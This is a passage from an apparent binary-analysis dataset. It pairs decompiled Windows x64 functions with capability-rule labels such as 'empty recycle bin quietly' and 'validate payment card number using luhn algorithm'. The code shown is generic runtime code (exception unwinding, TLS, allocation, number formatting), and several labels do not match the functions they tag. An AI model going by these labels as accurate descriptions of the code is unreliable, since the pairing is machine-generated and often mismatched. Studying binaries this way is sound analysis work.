0x14006f133;\n    cVar3 = fcn.140029ee0(&stack0xfffffffffffffe58, &stack0xfffffffffffffe48);\n    if (cVar3 != '\\0') {\n        *CONCAT44(uStack252, uStack256) = *CONCAT44(uStack252, uStack256) | 2;\n    }\n    *ppauStack296 = auStack424._0_4_;\n    *(ppauStack296 + 4) = auStack424._4_4_;\n    *(ppauStack296 + 1) = uStack416;\n    *(ppauStack296 + 0xc) = uStack416._4_4_;\n    uStackY576 = 0x14006f16c;\n    fcn.14007bf20(CONCAT44(uStack380, CONCAT22(uStack382, uStack384)) + -0x18);\n    uStackY576 = 0x14006f180;\n    fcn.14007bf20(CONCAT44(uStack388, uStack392) + -0x18);\n    return ppauStack296;\n}\n",
        "token_count": 31449
    },
    "140014cd": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nulong fcn.140014cd0(int32_t *arg1, int32_t *arg2, int32_t *arg3, int32_t **arg4)\n\n{\n    int32_t **ppiVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    ulong uVar4;\n    int32_t *piVar5;\n    int32_t **ppiVar6;\n    code *in_stack_00000028;\n    int32_t *piStack144;\n    int32_t *piStack120;\n    int32_t *piStack112;\n    ulong uStack104;\n    int32_t *piStack96;\n    int32_t **ppiStack88;\n    int32_t *piStack80;\n    int32_t **ppiStack72;\n    \n    iVar2 = *arg1;\n    ppiVar1 = *(arg1 + 8);\n    if ((arg1[1] & 0x20U) != 0) {\n        *(arg4[5] + 0x22) = *(arg1 + 0xe);\n        return 1;\n    }\n    piVar3 = arg1;\n    piVar5 = arg3;\n    ppiVar6 = arg4;\n    if (iVar2 == 0x21474343) goto code_r0x000140014db0;\n    uStack104 = *(arg4[5] + 0x26);\n    piStack96 = *arg4;\n    ppiStack88 = *0x14010f580;\n    piStack80 = *0x14010f588;\n    ppiVar6 = ppiVar1;\n    ppiStack72 = arg4;\n    if (iVar2 == 0x22474343) {\n        piStack112 = ppiVar1[6];\n        piStack120 = &stack0xffffffffffffff98;\n        (*ppiVar1[2])(*0x14010f580, 1, 10, *ppiVar1, ppiVar1);\n        piVar5 = *ppiVar1;\n        uVar4 = 10;\ncode_r0x000140014d55:\n        piStack120 = &stack0xffffffffffffff98;\n        piVar3 = 0x1;\n        iVar2 = (*in_stack_00000028)(1, uVar4);\n        if (iVar2 == 8) {\n            return 1;\n        }\n        if (iVar2 == 7) {\n            ppiVar6 = arg1 + 8;\n            piVar5 = 0x4;\n            piVar3 = 0x21474343;\n            *(arg1 + 0xe) = piStack80;\n            *(arg1 + 10) = arg2;\n            *(arg1 + 0xc) = piStack96;\n            (*_sym.imp.KERNEL32.dll_RaiseException)(0x21474343, 1);\n        }\n    }\n    else {\n        if (iVar2 != 0x20474343) {\n            return 1;\n        }\n        piVar5 = *ppiVar1;\n        if ((arg1[1] & 6U) != 0) {\n            uVar4 = 2;\n            goto code_r0x000140014d55;\n        }\n        piVar3 = 0x1;\n        piStack120 = &stack0xffffffffffffff98;\n        iVar2 = (*in_stack_00000028)(*0x14010f580, 1, 1);\n        if (iVar2 == 8) {\n            return 1;\n        }\n        if (iVar2 == 6) {\n            piVar5 = *ppiVar1;\n            piVar3 = 0x1;\n            ppiVar6 = ppiVar1;\n            piStack120 = &stack0xffffffffffffff98;\n            iVar2 = (*in_stack_00000028)(1, 6);\n            if (iVar2 == 7) {\n                ppiVar1[3] = arg2;\n                ppiVar1[4] = piStack96;\n                ppiVar1[5] = piStack80;\n                *(arg1 + 0xe) = piStack80;\n                piStack112 = arg4[8];\n                arg1[6] = 4;\n                *(arg1 + 10) = arg2;\n                *(arg1 + 0xc) = piStack96;\n                piVar3 = arg2;\n                ppiVar6 = ppiStack88;\n                piStack120 = arg3;\n                (*_sym.imp.KERNEL32.dll_RtlUnwindEx)(arg2, piStack96);\n                piVar5 = arg1;\n            }\n        }\n    }\n    sub.msvcrt.dll_abort();\ncode_r0x000140014db0:\n    if (arg2 != *(piVar3 + 10)) {\n        return 1;\n    }\n    piStack112 = ppiVar6[8];\n    piStack120 = piVar5;\n    (*_sym.imp.KERNEL32.dll_RtlUnwindEx)(arg2, *(piVar3 + 0xc), piVar3, ppiVar1);\n    uVar4 = 0x140014eee;\n    sub.msvcrt.dll_abort();\n    *(arg2 + 4) = 0x0;\n    *(arg2 + 8) = 0x0;\n    *(arg2 + 0xc) = 0x0;\n    piStack144 = arg2;\n    (*_sym.imp.KERNEL32.dll_RaiseException)(0, 0x20474343, 0, 1, &stack0xffffffffffffff70, uVar4);\n    return 5;\n}\n",
        "token_count": 1218
    },
    "14001522": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x0001400154d1: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x0001400154d6)\n\nuint64_t fcn.140015220(ulong *arg1)\n\n{\n    ulong uVar1;\n    int32_t *piVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int64_t iVar7;\n    uint64_t uVar8;\n    int64_t iVar9;\n    uint64_t uVar10;\n    uint64_t *puVar11;\n    uint64_t *puVar12;\n    uint64_t uVar13;\n    ulong *arg1_00;\n    uchar *puVar14;\n    ulong *puVar15;\n    ulong unaff_RBP;\n    int32_t *piVar16;\n    uint64_t uVar17;\n    uint64_t uVar18;\n    uint64_t unaff_R12;\n    ulong unaff_R13;\n    uchar auStack56 [32];\n    \n    puVar14 = &stack0xffffffffffffffc8;\n    piVar16 = arg1[1];\n    uVar1 = *arg1;\n    if (piVar16 < 0x9) {\n        iVar7 = sub.msvcrt.dll_malloc();\n        if (iVar7 != 0) {\n            iVar9 = arg1[3];\n            *iVar7 = iVar7;\n            uVar8 = iVar7 + 8;\njoined_r0x000140015298:\n            if (iVar9 != 0) {\n                uVar8 = sub.msvcrt.dll_memcpy(uVar8);\n                return uVar8;\n            }\n            uVar8 = sub.msvcrt.dll_memset(uVar8, 0, uVar1);\n            return uVar8;\n        }\n    }\n    else {\n        iVar9 = sub.msvcrt.dll_malloc();\n        if (iVar9 != 0) {\n            uVar8 = iVar9 + 7 + piVar16 & -piVar16;\n            *(uVar8 - 8) = iVar9;\n            iVar9 = arg1[3];\n            goto joined_r0x000140015298;\n        }\n    }\n    sub.msvcrt.dll_abort();\n    while( true ) {\n        uVar18 = 0;\n        arg1_00 = NULL;\n        *0x140136240 = -1;\n        uVar8 = 0xffff;\n        *(puVar14 + -0x30) = 0x1400152e1;\n        *0x140136248 = (*_sym.imp.KERNEL32.dll_CreateSemaphoreW)();\n        *(puVar14 + -0x30) = 0x1400152ee;\n        uVar4 = (*_sym.imp.KERNEL32.dll_TlsAlloc)();\n        if (uVar4 == 0xffffffff) {\n            *(puVar14 + -0x30) = 0x140015316;\n            uVar10 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        else {\n            arg1_00 = uVar4;\n            *(puVar14 + -0x30) = 0x140015307;\n            *0x140136238 = uVar4;\n            uVar10 = fcn.14001e7d0(arg1_00, 0x1400151d0);\n        }\n        if (uVar10 == 0) {\n            return uVar10;\n        }\n        *(puVar14 + -0x30) = 0x14001531d;\n        sub.msvcrt.dll_abort();\n        pcVar3 = _sym.imp.KERNEL32.dll_Sleep;\n        piVar2 = *0x14010fc90;\n        *(puVar14 + -0x30) = unaff_R13;\n        *(puVar14 + -0x38) = unaff_R12;\n        *(puVar14 + -0x40) = unaff_RBP;\n        *(puVar14 + -0x48) = uVar1;\n        *(puVar14 + -0x50) = piVar16;\n        *(puVar14 + -0x58) = arg1;\n        if (**0x14010fc90 == 0) {\n            if (arg1_00[2] != 0) {\n                return arg1_00[2];\n            }\n            *(puVar14 + -0x88) = 0x1400153c5;\n            uVar8 = fcn.140015220(arg1_00);\n            arg1_00[2] = uVar8;\n            return uVar8;\n        }\n        unaff_R12 = arg1_00[2];\n        if (unaff_R12 != 0) goto code_r0x000140015361;\n        if (**0x14010fc90 == 0) goto code_r0x0001400154ea;\n        uVar18 = *0x140106470;\n        if (*0x140106470 != 0) goto code_r0x0001400153ec;\n        LOCK();\n        *0x140106474 = *0x140106474 + 1;\n        if (*0x140106474 != 0) break;\n        puVar15 = puVar14 + -0x88;\n        puVar14 = puVar14 + -0x88;\n        *puVar15 = 0x1400154d6;\n        arg1 = arg1_00;\n        piVar16 = *0x14010fc90;\n    }\n    uVar8 = 0;\n    do {\n        *(puVar14 + -0x88) = 0x140015544;\n        (*pcVar3)();\n    } while (*0x140106470 == 0);\n    if (*piVar2 == 0) {\ncode_r0x0001400154ea:\n        unaff_R12 = arg1_00[2];\n        if (unaff_R12 == 0) {\ncode_r0x0001400154f7:\n            unaff_R12 = *0x140136230 + 1;\n            *0x140136230 = unaff_R12;\n            arg1_00[2] = unaff_R12;\n            goto code_r0x000140015407;\n        }\n    }\n    else {\ncode_r0x0001400153ec:\n        LOCK();\n        *0x140136240 = *0x140136240 + 1;\n        if (*0x140136240 != 0) {\n            *(puVar14 + -0x88) = 0x14001555e;\n            iVar6 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*0x140136248, 0xffffffff);\n            if (iVar6 != 0) {\n                LOCK();\n                *0x140136240 = *0x140136240 + -1;\n            }\n        }\n        unaff_R12 = arg1_00[2];\n        if (unaff_R12 == 0) goto code_r0x0001400154f7;\ncode_r0x000140015407:\n        if (*piVar2 != 0) {\n            LOCK();\n            *0x140136240 = *0x140136240 + -1;\n            if (-1 < *0x140136240) {\n                uVar8 = 0;\n                *(puVar14 + -0x88) = 0x140015434;\n                (*_sym.imp.KERNEL32.dll_ReleaseSemaphore)(*0x140136248, 1);\n            }\n        }\n    }\ncode_r0x000140015361:\n    pcVar3 = _sym.imp.KERNEL32.dll_GetLastError;\n    uVar4 = *0x140136238;\n    *(puVar14 + -0x88) = 0x140015371;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    *(puVar14 + -0x88) = 0x14001537b;\n    puVar11 = (*_sym.imp.KERNEL32.dll_TlsGetValue)(uVar4);\n    *(puVar14 + -0x88) = 0x140015386;\n    (*_sym.imp.KERNEL32.dll_SetLastError)(uVar5);\n    if (puVar11 == NULL) {\n        puVar11 = unaff_R12 + 0x21;\n        uVar10 = 8;\n        *(puVar14 + -0x88) = 0x140015454;\n        puVar12 = sub.msvcrt.dll_calloc();\n        if (puVar12 == NULL) {\ncode_r0x000140015573:\n            *(puVar14 + -0x88) = 0x140015578;\n            uVar13 = sub.msvcrt.dll_abort();\n            if (*puVar11 < uVar10) {\n                *puVar11 = uVar10;\n                puVar11[3] = 0;\n            }\n            if (puVar11[1] < uVar8) {\n                puVar11[1] = uVar8;\n            }\n            if ((uVar18 != 0) && (*puVar11 == uVar10)) {\n                puVar11[3] = uVar18;\n                return uVar13;\n            }\n            return uVar13;\n        }\n        *puVar12 = unaff_R12 + 0x20;\n    }\n    else {\n        uVar13 = *puVar11;\n        puVar12 = puVar11;\n        if (unaff_R12 <= uVar13) goto code_r0x00014001539b;\n        uVar17 = uVar13 * 2;\n        if (uVar13 * 2 < unaff_R12) {\n            uVar17 = unaff_R12 + 0x20;\n        }\n        uVar10 = uVar17 * 8 + 8;\n        *(puVar14 + -0x88) = 0x1400154a9;\n        puVar12 = sub.msvcrt.dll_realloc();\n        if (puVar12 == NULL) goto code_r0x000140015573;\n        *puVar12 = uVar17;\n        *(puVar14 + -0x88) = 0x1400154cf;\n        sub.msvcrt.dll_memset(puVar12 + uVar13 + 1, 0, (uVar17 - uVar13) * 8);\n    }\n    *(puVar14 + -0x88) = 0x140015472;\n    iVar6 = (*_sym.imp.KERNEL32.dll_TlsSetValue)(*0x140136238, puVar12);\n    if (iVar6 == 0) {\n        *(puVar14 + -0x88) = 0x14001547d;\n        (*pcVar3)();\n    }\ncode_r0x00014001539b:\n    uVar8 = puVar12[unaff_R12];\n    if (uVar8 == 0) {\n        *(puVar14 + -0x88) = 0x1400153b1;\n        uVar8 = fcn.140015220(arg1_00);\n        puVar12[unaff_R12] = uVar8;\n    }\n    return uVar8;\n}\n",
        "token_count": 2438
    },
    "14001f5f": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint8_t ** fcn.14001f5f0(code *arg1, uint8_t **arg2, uint8_t **arg3, uint8_t **arg4)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    uint8_t **ppuVar4;\n    code *arg1_00;\n    uint8_t uVar5;\n    uint8_t uVar6;\n    uint8_t **ppuVar7;\n    \n    uVar2 = arg1;\n    if (uVar2 == 0x50) {\n        ppuVar4 = arg3 + 7U & 0xfffffffffffffff8;\n        *arg4 = *ppuVar4;\n        return ppuVar4 + 1;\n    }\n    uVar3 = arg1 & 0xf;\n    if (0xc < uVar3) {\ncode_r0x00014001f73f:\n        sub.msvcrt.dll_abort();\n        (*arg1)();\n        arg1_00 = sub.msvcrt.dll_abort();\n        fcn.1400bc860(arg1_00);\n        sub.msvcrt.dll_abort();\n        (*arg1_00)();\n        fcn.1400b8f90();\n    // WARNING: Could not recover jumptable at 0x00014001e510. Too many branches\n    // WARNING: Treating indirect jump as call\n        ppuVar4 = (*_sym.imp.msvcrt.dll_free)();\n        return ppuVar4;\n    }\n    ppuVar4 = arg3;\n    // switch table (13 cases) at 0x14010a600\n    switch(*(uVar3 * 4 + 0x14010a600) + 0x14010a600) {\n    case 0x14001e510:\n        goto code_r0x00014001f73f;\n    case 0x14001f628:\n        ppuVar7 = *arg3;\n        ppuVar4 = arg3 + 1;\n        break;\n    case 0x14001f688:\n        ppuVar7 = *arg3;\n        ppuVar4 = arg3 + 2;\n        break;\n    case 0x14001f698:\n        ppuVar7 = *arg3;\n        ppuVar4 = arg3 + 4;\n        break;\n    case 0x14001f6a8:\n        ppuVar7 = *arg3;\n        ppuVar4 = arg3 + 4;\n        break;\n    case 0x14001f6b8:\n        ppuVar7 = *arg3;\n        ppuVar4 = arg3 + 2;\n        break;\n    case 0x14001f6c8:\n        ppuVar7 = NULL;\n        uVar5 = 0;\n        do {\n            uVar6 = *ppuVar4;\n            ppuVar4 = ppuVar4 + 1;\n            uVar1 = uVar5 & 0x3f;\n            uVar5 = uVar5 + 7;\n            ppuVar7 = ppuVar7 | (uVar6 & 0x7f) << uVar1;\n        } while (uVar6 < '\\0');\n        break;\n    case 0x14001f6f0:\n        ppuVar7 = NULL;\n        uVar3 = 0;\n        do {\n            uVar5 = *ppuVar4;\n            ppuVar4 = ppuVar4 + 1;\n            uVar6 = uVar3;\n            uVar3 = uVar3 + 7;\n            ppuVar7 = ppuVar7 | (uVar5 & 0x7f) << (uVar6 & 0x3f);\n        } while (uVar5 < '\\0');\n        if ((0x3f < uVar3) || ((uVar5 & 0x40) == 0)) break;\n        ppuVar7 = ppuVar7 | -1 << (uVar3 & 0x3f);\n        goto code_r0x00014001f634;\n    }\n    if (ppuVar7 != NULL) {\ncode_r0x00014001f634:\n        if ((uVar2 & 0x70) == 0x10) {\n            arg2 = arg3;\n        }\n        ppuVar7 = ppuVar7 + arg2;\n        if (uVar2 < '\\0') {\n            *arg4 = *ppuVar7;\n            return ppuVar4;\n        }\n    }\n    *arg4 = ppuVar7;\n    return ppuVar4;\n}\n",
        "token_count": 1016
    },
    "1400aca1": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nvoid fcn.1400aca10(int64_t **arg1)\n\n{\n    int64_t **ppiVar1;\n    int64_t *piVar2;\n    uint32_t uVar3;\n    int64_t *piVar4;\n    ulong arg1_00;\n    uint64_t *puVar5;\n    int64_t **ppiVar6;\n    uint64_t uVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    int64_t in_RDX;\n    int64_t iVar10;\n    \n    ppiVar6 = *arg1;\n    ppiVar1 = arg1 + 2;\n    if (ppiVar6 == ppiVar1) {\n        return;\n    }\n    piVar2 = arg1[1];\n    if (piVar2 < 0x8) {\n        if (piVar2 == NULL) {\n            *(arg1 + 2) = *ppiVar6;\n            goto code_r0x0001400aca70;\n        }\n        uVar7 = (piVar2 + 1U) * 2;\n        uVar3 = uVar7;\n        if (7 < uVar3) {\n            arg1[2] = *ppiVar6;\n            *(arg1 + (uVar7 & 0xffffffff) + 8) = *(ppiVar6 + ((uVar7 & 0xffffffff) - 8));\n            iVar10 = ppiVar1 - (arg1 + 3 & 0xfffffffffffffff8);\n            uVar3 = uVar3 + iVar10 & 0xfffffff8;\n            if (7 < uVar3) {\n                uVar8 = 0;\n                do {\n                    uVar7 = uVar8;\n                    uVar8 = uVar8 + 8;\n                    *((arg1 + 3 & 0xfffffffffffffff8) + uVar7) = *(ppiVar6 + (uVar7 - iVar10));\n                } while (uVar8 < uVar3);\n            }\n            goto code_r0x0001400aca70;\n        }\n        if ((uVar7 & 4) != 0) {\n            *(arg1 + 2) = *ppiVar6;\n            *(arg1 + (uVar7 & 0xffffffff) + 0xc) = *(ppiVar6 + ((uVar7 & 0xffffffff) - 4));\n            goto code_r0x0001400aca70;\n        }\n        if ((uVar3 == 0) || (*(arg1 + 2) = *ppiVar6,  (uVar7 & 2) == 0)) goto code_r0x0001400aca70;\n    }\n    else {\n        if (arg1[2] <= piVar2) {\n            return;\n        }\n        uVar7 = piVar2 + 1;\n        if (uVar7 >> 0x3e == 0) {\n            piVar4 = fcn.1400bc710(uVar7 * 2);\n            ppiVar6 = *arg1;\n            sub.msvcrt.dll_memcpy(piVar4, ppiVar6, uVar7 * 2);\n            if (ppiVar1 != ppiVar6) {\n                fcn.1400bc6c0(ppiVar6);\n            }\n            *arg1 = piVar4;\n            arg1[2] = piVar2;\n            return;\n        }\n        if (uVar7 < 0) {\n            arg1_00 = fcn.1400bd1b0();\n            if (in_RDX == 1) {\n                fcn.1400bc860(arg1_00);\n                fcn.1400bcd60();\n            }\n            fcn.1400bc860(arg1_00);\n            puVar5 = fcn.1400bcb70();\n            uVar7 = *puVar5;\n            if (uVar7 != 0) {\n                if (1 < *(uVar7 + 0x50) + 0xb8b1aabcbcd4d500U) {\n                    *puVar5 = 0;\ncode_r0x000140015030:\n                    if (*(uVar7 + 0x58) != NULL) {\n    // WARNING: Could not recover jumptable at 0x000140015041. Too many branches\n    // WARNING: Treating indirect jump as call\n                        (**(uVar7 + 0x58))(1, uVar7 + 0x50);\n                        return;\n                    }\n                    return;\n                }\n                iVar9 = *(uVar7 + 0x28);\n                if (iVar9 < 0) {\n                    iVar9 = iVar9 + 1;\n                    if (iVar9 == 0) {\n                        *puVar5 = *(uVar7 + 0x20);\n                    }\n                }\n                else {\n                    iVar9 = iVar9 + -1;\n                    if (iVar9 == 0) {\n                        *puVar5 = *(uVar7 + 0x20);\n                        goto code_r0x000140015030;\n                    }\n                    if (iVar9 == -1) {\n                        fcn.1400b8f90();\n                        if ((*0x140106bb8 < uVar7) && (uVar7 < *0x140106bb8 + *0x140106bc0)) {\n                            fcn.14001fff0(uVar7);\n                            return;\n                        }\n    // WARNING: Could not recover jumptable at 0x00014001e510. Too many branches\n    // WARNING: Treating indirect jump as call\n                        (*_sym.imp.msvcrt.dll_free)();\n                        return;\n                    }\n                }\n                *(uVar7 + 0x28) = iVar9;\n            }\n            return;\n        }\n        uVar3 = fcn.1400bd170();\n    }\n    *(arg1 + uVar3 + 0xe) = *(ppiVar6 + (uVar3 - 2));\ncode_r0x0001400aca70:\n    fcn.1400bc6c0();\n    *arg1 = ppiVar1;\n    return;\n}\n",
        "token_count": 1319
    },
    "1400156c": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nvoid fcn.1400156c0(ulong arg1, ulong arg2)\n\n{\n    uint32_t uVar1;\n    uchar auStack12 [12];\n    \n    uVar1 = fcn.1400160f0(arg1, arg2, 0x1401064a0, auStack12);\n    // switch table (6 cases) at 0x14010f5c0\n    switch(uVar1 & 7) {\n    case 1:\n    case 5:\n        break;\n    case 2:\n        break;\n    case 3:\n        break;\n    case 4:\n    }\n    return;\n}\n",
        "token_count": 138
    },
    "14001576": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 * fcn.140015760(float10 *arg1, ulong arg2, ulong arg3)\n\n{\n    uint32_t uVar1;\n    int16_t aiStack36 [2];\n    ulong uStack32;\n    uchar auStack24 [16];\n    \n    auStack24._0_10_ = 0;\n    uVar1 = fcn.1400160f0(arg2, arg3, 0x1401064c0, aiStack36);\n    // switch table (6 cases) at 0x14010f5e0\n    switch(uVar1 & 7) {\n    case 1:\n    case 5:\n        auStack24._0_10_ = CONCAT28(aiStack36[0] + 0x403e, auStack24._0_8_);\n    case 2:\n        auStack24._0_10_ = CONCAT28(auStack24._8_2_, uStack32);\n        break;\n    case 3:\n        auStack24._0_10_ = CONCAT46(*0x14010f5f8, auStack24._0_6_);\n        if ((uVar1 & 8) == 0) goto code_r0x0001400157d5;\n        goto code_r0x0001400157ce;\n    case 4:\n        auStack24._0_10_ = CONCAT46(*0x14010f5fc, auStack24._0_6_);\n    }\n    if ((uVar1 & 8) != 0) {\ncode_r0x0001400157ce:\n        auStack24._0_10_ = auStack24._0_10_ | 0x8000;\n    }\ncode_r0x0001400157d5:\n    *arg1 = auStack24._0_10_;\n    return arg1;\n}\n",
        "token_count": 409
    },
    "1400155b": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nuint64_t fcn.1400155b0(ulong arg1, ulong arg2)\n\n{\n    uint64_t uVar1;\n    uint32_t uVar2;\n    ulong unaff_RBX;\n    int32_t aiStack20 [2];\n    uint32_t uStack12;\n    \n    uVar1 = fcn.1400160f0(arg1, arg2, 0x140106480, aiStack20);\n    uVar2 = unaff_RBX >> 0x20;\n    // switch table (7 cases) at 0x14010f5a0\n    switch(uVar1 & 7) {\n    case 0:\n    case 6:\n        uVar2 = 0;\n        goto joined_r0x00014001566e;\n    case 1:\n        uVar2 = (aiStack20[0] + 0x433) * 0x100000 | uStack12 & 0xffefffff;\njoined_r0x00014001566e:\n        if ((uVar1 & 8) == 0) {\n            return uVar1;\n        }\n        goto code_r0x000140015611;\n    case 2:\n        uVar2 = uStack12;\n        break;\n    case 3:\n        uVar2 = 0x7ff00000;\n        break;\n    case 4:\n        uVar2 = 0x7ff80000;\n        break;\n    case 5:\n        uVar2 = uStack12 | 0x7ff00000;\n    }\n    if ((uVar1 & 8) != 0) {\ncode_r0x000140015611:\n        uVar1 = (uVar2 | 0x80000000) << 0x20;\n    }\n    return uVar1;\n}\n",
        "token_count": 391
    },
    "1400bce0": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t fcn.1400bce00(int64_t *arg1, ulong arg2, int64_t *arg3, int64_t arg4)\n\n{\n    int64_t *piVar1;\n    uint32_t uVar2;\n    int64_t *piVar3;\n    int64_t iStack72;\n    ulong uStack64;\n    ulong uStack56;\n    \n    if (arg1 != NULL) {\n        piVar3 = *(*arg1 + -0x10) + arg1;\n        piVar1 = *(*arg1 + -8);\n        iStack72 = 0;\n        uStack56 = 0x1000000000;\n        uStack64 = 0;\n        if ((*(*piVar3 + -8) == piVar1) &&\n           ((**(*piVar1 + 0x38))(piVar1, arg4, 6, arg3, piVar3, arg2, arg1, &iStack72),  iStack72 != 0)) {\n            if ((uStack56 & 6) == 6) {\n                return iStack72;\n            }\n            if ((uStack64 & uStack64._4_4_ & 6) == 6) {\n                return iStack72;\n            }\n            if (((uStack64._4_4_ & 5) != 4) && (uStack56 == 0)) {\n                if (arg4 < 0) {\n                    if ((arg4 != -2) &&\n                       (uVar2 = (**(*arg3 + 0x40))(arg3, arg4, iStack72, arg2, arg1),  (uVar2 & 6) == 6)) {\n                        return iStack72;\n                    }\n                }\n                else if (arg1 == iStack72 + arg4) {\n                    return iStack72;\n                }\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 424
    },
    "14001581": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint64_t fcn.140015810(ulong arg1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uchar uStack11;\n    uint16_t uStack10;\n    \n    if (arg1 != -1) {\n        uStack11 = arg1;\n        uStack10 = 0xffff;\n        uVar1 = sub.msvcrt.dll____lc_codepage_func();\n        iVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(uVar1, 8, &uStack11, 1, &uStack10, 1);\n        if (iVar2 != 0) {\n            return uStack10;\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 156
    },
    "140015b3": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint64_t fcn.140015b30(int64_t arg1)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int64_t iVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    \n    iVar4 = *(arg1 + 0x14);\n    iVar5 = iVar4;\n    piVar2 = arg1 + 0x18;\n    do {\n        if (*piVar2 != -1) {\n            *piVar2 = *piVar2 + 1;\n            return arg1;\n        }\n        piVar1 = piVar2 + 1;\n        *piVar2 = 0;\n        piVar2 = piVar1;\n    } while (piVar1 < arg1 + 0x18 + iVar5);\n    iVar3 = arg1;\n    if (*(arg1 + 0xc) <= iVar4) {\n        iVar3 = fcn.14001ceb0(*(arg1 + 8) + 1);\n        sub.msvcrt.dll_memcpy(iVar3 + 0x10, arg1 + 0x10, *(arg1 + 0x14) * 4 + 8);\n        fcn.14001cfa0(arg1);\n        iVar4 = *(iVar3 + 0x14);\n        iVar5 = iVar4;\n    }\n    *(iVar3 + 0x14) = iVar4 + 1;\n    *(iVar3 + 0x18 + iVar5 * 4) = 1;\n    return iVar3;\n}\n",
        "token_count": 336
    },
    "14001913": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.140019130(ulong arg1, ulong arg2, ulong arg3, int64_t *arg4)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    char *pcVar5;\n    uint64_t arg1_00;\n    char *pcVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    ulong auStack112 [5];\n    char acStack72 [8];\n    ulong uStack64;\n    \n    iVar8 = 1;\n    arg3._0_4_ = arg3 + -1;\n    arg1_00 = arg3;\n    while (arg3._0_4_ = arg3 / 10,  arg3 != 0) {\n        iVar8 = iVar8 + 1;\n    }\n    iVar2 = *(arg4 + 0x2c);\n    if (iVar2 == -1) {\n        *(arg4 + 0x2c) = 2;\n        iVar2 = 2;\n    }\n    if (iVar8 <= iVar2) {\n        iVar8 = iVar2;\n    }\n    iVar2 = *(arg4 + 0xc) - (iVar8 + 2);\n    if (*(arg4 + 0xc) <= iVar8 + 2) {\n        iVar2 = -1;\n    }\n    *(arg4 + 0xc) = iVar2;\n    uStack64 = 0x1400191c3;\n    fcn.140018d50(arg1, arg2, 1, arg4);\n    uVar9 = *(arg4 + 1);\n    *(arg4 + 2) = *(arg4 + 0x2c);\n    *(arg4 + 1) = uVar9 | 0x1c0;\n    uStack64 = 0x1400191e4;\n    fcn.140017f90(uVar9 & 0x20 | 0x45, arg4);\n    *(arg4 + 0xc) = *(arg4 + 0xc) + iVar8 + 1;\n    iVar8 = *(arg4 + 2);\n    uVar9 = *(arg4 + 1);\n    iVar2 = *(arg4 + 0xc);\n    auStack112[0] = 0x1400188c7;\n    iVar3 = fcn.1400147b0(arg1_00);\n    iVar3 = -iVar3;\n    pcVar1 = &stack0xffffffffffffffb8 + iVar3;\n    if ((uVar9 & 0x80) == 0) {\ncode_r0x0001400188e6:\n        pcVar5 = pcVar1;\n        if (arg1_00 != 0) goto code_r0x0001400188f2;\n    }\n    else {\n        if (-1 < arg1_00) {\n            uVar9 = uVar9 & 0xffffff7f;\n            *(arg4 + 1) = uVar9;\n            goto code_r0x0001400188e6;\n        }\n        arg1_00 = -arg1_00;\ncode_r0x0001400188f2:\n        pcVar5 = pcVar1;\n        while( true ) {\n            pcVar6 = pcVar5;\n            pcVar5 = pcVar6 + 1;\n            uVar4 = arg1_00 / 10;\n            *pcVar6 = arg1_00 + uVar4 * -10 + '0';\n            if (arg1_00 < 10) break;\n            arg1_00 = uVar4;\n            if ((((pcVar1 != pcVar5) && ((uVar9 & 0x1000) != 0)) && (*(arg4 + 4) != 0)) &&\n               ((pcVar5 - pcVar1 & 0x8000000000000003U) == 3)) {\n                *pcVar5 = ',';\n                pcVar5 = pcVar6 + 2;\n            }\n        }\n    }\n    pcVar6 = pcVar5;\n    if (iVar8 < 1) {\ncode_r0x0001400189b0:\n        pcVar5 = pcVar6;\n        if ((pcVar1 != pcVar6) || (iVar8 == 0)) goto code_r0x0001400189c1;\n    }\n    else {\n        iVar7 = iVar8 - (pcVar5 - pcVar1);\n        if (0 < iVar7) {\n            pcVar6 = pcVar5 + iVar7;\n            *(&stack0xffffffffffffff90 + iVar3) = 0x1400189b0;\n            sub.msvcrt.dll_memset(pcVar5, 0x30, iVar7);\n            goto code_r0x0001400189b0;\n        }\n        pcVar6 = pcVar1;\n        if (pcVar1 != pcVar5) goto code_r0x0001400189c1;\n    }\n    *pcVar6 = '0';\n    pcVar5 = 